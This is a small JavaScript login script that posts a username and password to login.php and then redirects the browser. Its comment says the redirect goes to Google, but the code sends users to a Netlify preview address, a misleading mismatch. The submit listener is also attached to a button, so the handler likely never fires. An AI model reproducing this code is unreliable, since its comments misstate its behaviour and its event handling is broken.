document.getElementById("login-btn").addEventListener("submit", function (event) {
    event.preventDefault(); // Prevent the default form submission
    attemptLogin();
});

function attemptLogin() {
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;

    // Perform AJAX request to server for login validation
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "login.php", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function () {
        if (xhr.readyState == 4) {
            if (xhr.status == 200) {
                var response = JSON.parse(xhr.responseText);
                if (response.success) {
                    // Redirect to Google on successful login
                    window.location.href = "https://666a668d57f9fb7df1676f56--lustrous-otter-7110e5.netlify.app/";
                } else {
                    // Display an alert and refresh the page on unsuccessful login
                    alert("Incorrect username or password. Please try again.");
                    location.reload(true);
                }
            } else {
                // Display an alert and refresh the page on error in the AJAX request
                alert("Error in the AJAX request");
                location.reload(true);
            }
        }
    };
    xhr.send("username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password));
}
